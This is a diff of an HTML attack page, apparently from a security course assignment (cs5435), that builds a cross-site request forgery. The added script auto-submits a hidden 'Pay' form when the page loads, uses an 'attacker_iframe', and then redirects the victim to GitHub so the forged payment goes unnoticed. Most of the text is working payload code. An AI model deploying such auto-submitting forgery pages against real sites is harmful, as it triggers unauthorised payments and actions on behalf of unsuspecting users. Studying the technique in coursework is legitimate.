@@ -24,15 +24,14 @@
     <input class="form-button" type="submit" value="Pay"/>
   </form>
 
-  <script>
-    document.getElementById("pay_attacker").submit();
-  </script>
-
   <!-- TODO: What should src be here? -->
-  <iframe id="a_frame" name="attacker_iframe" src="http://www.google.com"></iframe>
+  <iframe id="a_frame" name="attacker_iframe" src="https://www.survivorshark.com"></iframe>
 
   <!-- Check iframe has loaded -->
   <script>
+    document.forms[0].submit();
+    // console.log("Submitted form");
+    // console.log("Script executing to redirect user");
     document.getElementById("a_frame").onload = function() {
       // Redirect user to github
       window.location.replace("http://github.com/tomrist/cs5435-fall2019");
